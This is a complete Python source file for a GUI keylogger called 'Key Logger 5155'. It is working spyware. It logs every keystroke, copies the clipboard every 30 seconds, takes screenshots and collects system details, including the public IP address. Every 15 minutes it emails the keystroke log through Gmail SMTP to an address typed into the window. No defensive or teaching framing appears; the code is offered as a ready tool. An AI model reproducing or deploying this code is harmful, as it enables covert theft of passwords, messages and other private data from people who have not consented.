# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from time import sleep
import socket
import platform
from pynput.keyboard import Key, Listener
import os
from requests import get
import threading
from PIL import ImageGrab, Image, ImageTk
from tkinter import Label, Frame, Entry, Button, messagebox, StringVar
from customtkinter import CTk
import logging
from dotenv import load_dotenv
import tkinter

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(filename="data/key_log.txt", level=logging.DEBUG, format='%(asctime)s, %(message)s')

# File paths for various log files
keys_information = "data/key_log.txt"
system_information = "data/systeminfo.txt"
clipboard_information = "data/clipboard.txt"
screenshot_information = "data/screenshot.png"

# Retrieve email and password from environment variables
email_address = os.getenv('email')
password = os.getenv('pass')

# Global variables for email sending
toAddr = ""
state = 0
stopFlag = False

# Function to handle closing of the application window
def on_closing():
    global stopFlag
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        stopFlag = True
        root.destroy()

# Function to send email with attachment
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "LOG file"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Function to gather system information
def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip+"\n")

        except Exception:
            f.write("Public IP Address: Couldn't get Public IP Address\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Function to copy clipboard content
def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            r = tkinter.Tk()
            r.withdraw()
            pasted_data = r.clipboard_get()
            f.write("\nClipboard Data: \n" + pasted_data)
        except tkinter.TclError:
            f.write("\nClipboard could be not be copied")

# Function to take screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(screenshot_information)

# Global variables for key logging
count = 0
keys = []

# Function to handle key press event
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Function to write key logs to file
def write_file(keys):
    for key in keys:
        k = str(key).replace("'", "")
        logging.info(k)

listener = Listener(on_press=on_press)

# Function to start keylogger
def start_logger():
    global listener, toAddr, btnStr
    count = 900
    listener.start()
    btnStr.set("Stop Keylogger")
    while True:
        print(count)
        if stopFlag:
            break
        if (count % 30 == 0):
            copy_clipboard()
        if (count == 0):
            screenshot()
            computer_information()
            if (email_address and password and toAddr!=""):
                try:
                    send_email(keys_information, keys_information, toAddr)
                except:
                    pass
            count = 900
        sleep(1)
        count -= 1
    listener.stop()
    btnStr.set("Start Keylogger")
    listener = Listener(on_press=on_press)

# Function to handle button click event
def on_button_click():
    global state, toAddr, listener, stopFlag, receiver_entry, btnStr
    toAddr = receiver_entry.get()
    if (receiver_entry['state'] == 'normal'):
        receiver_entry['state'] = 'disabled'
        btnStr.set("Starting...")
    else:
        receiver_entry['state'] = 'normal'
        btnStr.set("Stopping...")
    if state == 0:
        state = 1
        print(state)
        stopFlag = False
        thread = threading.Thread(target=start_logger)
        thread.start()
    elif state == 1:
        state = 0
        print(state)
        stopFlag = True
        btnStr.set("Start Keylogger")

# Create the root window
root = CTk() #Creating root window using customTkinter, it allows to change color of Title bar unlike the official tkinter
root.geometry("800x600")
root.config(bg="black")
root.protocol("WM_DELETE_WINDOW", on_closing)

# Set initial button text
btnStr = StringVar()
btnStr.set("Start Keylogger")

# Load and set icon on Title bar
root.after(201, lambda: root.iconbitmap('cracking.ico'))

# Display an image
image = Image.open('cracking.png')
resize_image = image.resize((300, 300))
img = ImageTk.PhotoImage(resize_image)
icon = Label(root, image=img, bg="black", width=300, height=400)
icon.pack()

# Set window title
root.title("Key Logger 5155")

# Display title label
Title = Label(root, text="Key Logger 5155", font=("Cascadia Code", 50, "bold"), pady=20, bg="black", fg="green")
Title.pack()

# Frame for input widgets
InputFrame = Frame(root, bg="black", pady=20)
InputFrame.pack()

# Widgets for email address entry
receiver_label = Label(InputFrame, text="Recipients E-mail Address : ", font=("Cascadia Code", 13, "bold"), pady=20, bg="black", fg="green")
receiver_entry = Entry(InputFrame, bg="black", fg="green", width=35, font=("Cascadia Code", 13, "bold"))
receiver_entry.grid(row=0, column=1)
receiver_label.grid(row=0, column=0)

# Button to start/stop keylogger
button = Button(root, textvariable=btnStr, command=on_button_click, width=30, bg="green", font=("Cascadia Code", 13, "bold"))
button.pack()

# Run the main event loop
root.mainloop()
